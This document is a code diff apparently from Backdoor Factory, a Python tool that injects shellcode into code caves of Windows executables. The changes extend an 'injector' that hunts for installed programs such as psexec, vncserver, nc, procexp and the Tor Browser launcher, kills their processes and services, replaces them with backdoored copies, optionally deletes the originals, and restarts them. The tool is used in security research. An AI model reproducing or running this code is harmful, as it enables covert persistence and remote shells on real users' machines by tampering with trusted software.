@@ -25,7 +25,8 @@
 
     Currently supports win32 EXEs/DLLs only (intel architecture).
     This program is to be used for only legal activities by IT security
-    professionals and researchers.
+    professionals and researchers. Author not responsible for malicious
+    uses.
 
 '''
 
@@ -60,6 +61,8 @@ MachineTypes = {'0x0': 'AnyMachineType', '0x1d3': 'Matsushita AM33',
                 '0x1c2': 'ARM or Thumb -interworking',
                 '0x169': 'MIPS little-endian WCE v2'
                 }
+
+supported_types = ['Intel x86']
 
 author = """\
          Author: Joshua Pitts
@@ -191,7 +194,7 @@ op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x50': 1, '0x51': 1, '0x52': 1, '0x53': 1,
             '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
             '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
-            '0x5c': 1, '0x5d': 2, '0x5e': 1, '0x5f': 1,
+            '0x5c': 1, '0x5d': 1, '0x5e': 1, '0x5f': 1,
             '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
             '0x6203': 2,
             '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
@@ -202,22 +205,24 @@ op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x74': 2, '0x75': 2, '0x76': 2, '0x77': 2,
             '0x78': 2,
             '0x79': 2, '0x8001': 3, '0x8002': 3,
-            '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0xeb': 2, '0x8be5': 2,
+            '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0x8be5': 2,
             '0x880a': 2, '0x8bc7': 2, '0x8bf4': 2, '0x893e': 2,
             '0x8965': 3, '0xFF15': 6, '0x8b4e': 3, '0x8b46': 3,
             '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
             '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
             '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2,
             '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
-            '0x33c0': 2, '0x33c9': 2,
+            '0x33c0': 2, '0x33c9': 2, '0x89e5': 2, '0x89ec': 3,
+            '0xc70424': 7, '0xc9': 1,
             '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
             '0xe8': 5, '0x68': 5, '0xe9': 5,
             '0xbf': 5, '0xbe': 5,
-            '0xcc': 1,
+            '0xcc': 1, '0xcd': 2,
             '0xffd3': 2,
             '0x33f6': 2,
             '0x895c24': 4, '0x8da424': 7,
-            '0xa1': 5, '0xc3': 1
+            '0xa1': 5, '0xa3': 5, '0xc3': 1,
+            '0xeb': 2,
             }
 
 
@@ -661,32 +666,31 @@ def patch_initial_instructions(fileItems, ImpList, count_bytes):
     #one for each type of code cave module and this could be a variable
 
     f.write(struct.pack('<i', fileItems['JMPtoCodeAddress']))
-    #align the stack if the first OpCode+instruction is less
+    #align the stack if the     first OpCode+instruction is less
     #than 5 bytes fill with nops to align everything. Not a for loop.
     FrstOpCode = ImpList[0][1].keys()[0]
     #print "FrstOpCode", hex(FrstOpCode)
-
     if op_codes[hex(FrstOpCode)] == 7:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             f.write(struct.pack('=B', int('90', 16)))
     if op_codes[hex(FrstOpCode)] == 6:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
     if op_codes[hex(FrstOpCode)] == 5:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             #f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
             pass
     if op_codes[hex(FrstOpCode)] == 4:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             f.write(struct.pack('=BB', int('90', 16)))
     if op_codes[hex(FrstOpCode)] == 3:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             f.write(struct.pack('=B', int('90', 16)))
     if op_codes[hex(FrstOpCode)] == 2:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
     if op_codes[hex(FrstOpCode)] == 1:
-        if count_bytes % 5 != 0:
+        if count_bytes % 5 != 0 and count_bytes < 5:
             f.write(struct.pack('=BBB', int('90', 16),
                                 int('90', 16),
                                 int('90', 16)))
@@ -1000,6 +1004,7 @@ def find_all_caves(fileItems, shellcode_length):
     This function finds all the codecaves in a inputed file.
     Prints results to screen
     """
+    print "Looking for caves..."
     SIZE_CAVE_TO_FIND = shellcode_length
     Tracking = 0
     count = 0
@@ -1073,7 +1078,8 @@ def find_all_caves(fileItems, shellcode_length):
 def find_cave(fileItems, shellcode_length):
     """This function finds all code caves, allowing the user
     to pick the cave for injecting shellcode."""
-
+    print "Looking for caves that will fit a shellcode "\
+          "of %s length\n" % shellcode_length
     SIZE_CAVE_TO_FIND = shellcode_length
     Tracking = 0
     count = 0
@@ -1197,14 +1203,17 @@ def do_thebackdoor(filename, backdoorfile, shellcode,
     """
     global fileItems
     fileItems = gather_file_info(filename, backdoorfile)
+    if fileItems is False:
+        return None
     fileItems['NewCodeCave'] = NewCodeCave
+    '''
     if MachineTypes[hex(fileItems['MachineType'])] != "Intel x86":
         for item in fileItems:
             print item+':', fileItems[item]
         print ("This program does not support this format: %s"
                % MachineTypes[hex(fileItems['MachineType'])])
         return None
-
+    '''
     #Creating file to backdoor
     shutil.copy2(filename, fileItems['backdoorfile'])
     global f
@@ -1362,8 +1371,25 @@ def set_shells(SHELL, PORT, HOST=""):
     return shellcode
 
 
+def support_check(filename, backdoorfile):
+    """
+    This function is for checking if the current exe/dll is
+    supported by this program. Returns false if not supported,
+    returns fileItems if it is.
+    """
+    fileItems = gather_file_info(filename, backdoorfile)
+    if MachineTypes[hex(fileItems['MachineType'])] not in supported_types:
+        for item in fileItems:
+            print item+':', fileItems[item]
+        print ("This program does not support this format: %s"
+               % MachineTypes[hex(fileItems['MachineType'])])
+        return False
+    else:
+        return fileItems
+
+
 def injector(suffix, change_Access, SHELL, encoder, host,
-             port, nsection, add_section, verbose):
+             port, nsection, add_section, verbose, delete_original):
     """
     The injector module will hunt and injection shellcode into
     targets that are in the list_of_targets dict.
@@ -1373,23 +1399,25 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                        }
     """
     shellcode = set_shells(SHELL, port, host)
-    kill = False
 
     #add putty
-    list_of_targets = {#'hamachi-2.exe':
-                       #[('hamachi-2.exe', ), "Hamachi2Svc", True],
-                       'Tcpview.exe':
-                       [('Tcpview.exe',), None, True],
+    #may need to include full path of dependencies to
+    # restart
+    list_of_targets = {'hamachi-2.exe':
+                       [('hamachi-2.exe', ), "Hamachi2Svc", True],
+                       'tcpview.exe': [('tcpview.exe',), None, True],
                        #'rpcapd.exe':
                        #[('rpcapd.exe'), None, False],
-                       #'psexec.exe':
-                       #[('psexec.exe,'), None, False],
-                       #'vncserver.exe':
-                       #[('vncserver.exe', ), 'vncserver', True],
+                       'psexec.exe': [('psexec.exe',), 'PSEXESVC.exe', False],
+                       'vncserver.exe':
+                       [('vncserver.exe', ), 'vncserver', True],
                        # must append code cave for vmtoolsd.exe
-                       #'vmtoolsd.exe':
-                       #[('vmtools.exe',), 'VMTools', True],
-                       #'nc.exe': [('nc.exe', ), None, False],
+                       'vmtoolsd.exe':
+                       [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],
+                       'nc.exe': [('nc.exe', ), None, False],
+                       'Start Tor Browser.exe':
+                       [('Start Tor Browser.exe', ), None, False],
+                       'procexp.exe': [('procexp.exe', ), None, True],
                        }
 
     os_name = os.name
@@ -1411,12 +1439,14 @@ def injector(suffix, change_Access, SHELL, encoder, host,
     #print system_info
     winXP2003x86targetdirs = [rootdir+'\\']
     winXP2003x86excludedirs = [rootdir+'\\Windows\\',
-                               rootdir+'\\RECYCLER\\']
+                               rootdir+'\\RECYCLER\\',
+                               '\\VMWareDnD\\']
     vista7win82012x64targetdirs = [rootdir+'\\',
                                    rootdir + '\\Program Files (x86)\\']
     vista7win82012x64excludedirs = [rootdir+'\\Program Files\\',
                                     rootdir+'\\Windows\\',
-                                    rootdir+'\\RECYCLER\\']
+                                    rootdir+'\\RECYCLER\\',
+                                    '\\VMwareDnD\\']
 
     #need win2003, win2008, win8
     if "5.0." in winversion:
@@ -1504,6 +1534,9 @@ def injector(suffix, change_Access, SHELL, encoder, host,
         service_target = False
         running_proc = False
         #get filename
+        support_result = support_check(target, 'holdingfile.exe')
+        if support_result is False:
+            continue
         filename = os.path.basename(target)
         file_path = os.path.dirname(target)+'\\'
         for process in process_list:
@@ -1516,14 +1549,14 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                         if item.lower() in [x.lower() for x in process]:
                             print "Killing process:", item
                             try:
-                                print process[1]
+                                #print process[1]
                                 os.system("taskkill /F /PID %i" %
                                           int(process[1]))
                                 running_proc = True
                             except Exception as e:
                                 print str(e)
                     if setprocess.lower() in [x.lower() for x in process]:
-                        print True, items[0], items[1]
+                        #print True, items[0], items[1]
                         if items[1] is not None:
                             print "Killing Service:", items[1]
                             try:
@@ -1549,25 +1582,30 @@ def injector(suffix, change_Access, SHELL, encoder, host,
             os.unlink(target)
         except:
             print "unlinking error"
-        time.sleep(1)
+        time.sleep(.5)
         try:
             shutil.copy2(output_file, target)
         except:
             os.system('move {0} {1}'.format(target, output_file))
+        time.sleep(.5)
         os.remove(output_file)
         print ("The original file {0} has been renamed to {1}".format(target,
                target+suffix))
 
+        if delete_original is True:
+            print "!!Warning Deleteing Original File!!"
+            os.remove(target+suffix)
+
         if service_target is True:
-            print "items[1]:", list_of_targets[filename][1]
+            #print "items[1]:", list_of_targets[filename][1]
             os.system('net start %s' % list_of_targets[filename][1])
-        elif items[2] is True and running_proc is True:
+        elif list_of_targets[filename][2] is True and running_proc is True:
             # Todo: Need to build in a process counter and only restart that
             # number of running instances at time of process killing
             subprocess.Popen([target, ])
             print "Restarting:", target
         else:
-            print "%s was not found online not restarting" % target
+            print "%s was not found online -  not restarting" % target
 
 
 if __name__ == "__main__":
@@ -1640,6 +1678,12 @@ if __name__ == "__main__":
                       action="store", type="string",
                       help="For use with injector, places a suffix"
                       " on the original file for easy recovery")
+    parser.add_option("-D", "--delete_original", default=False,
+                      dest="DELETE_ORIGINAL", action="store_true",
+                      help="For use with injector module.  This command"
+                      " deletes the original file.  Not for use in production "
+                      "systems.  *Author not responsible for stupid uses.*")
+
     (options, args) = parser.parse_args()
 
     verbose = options.VERBOSE
@@ -1648,7 +1692,8 @@ if __name__ == "__main__":
     if options.INJECTOR is True:
         injector(options.SUFFIX, change_access, options.SHELL,
                  options.ENCODER, options.HOST, options.PORT,
-                 options.NSECTION, options.ADD_SECTION, verbose)
+                 options.NSECTION, options.ADD_SECTION, verbose,
+                 options.DELETE_ORIGINAL)
         sys.exit()
 
     if options.CAVE is True:
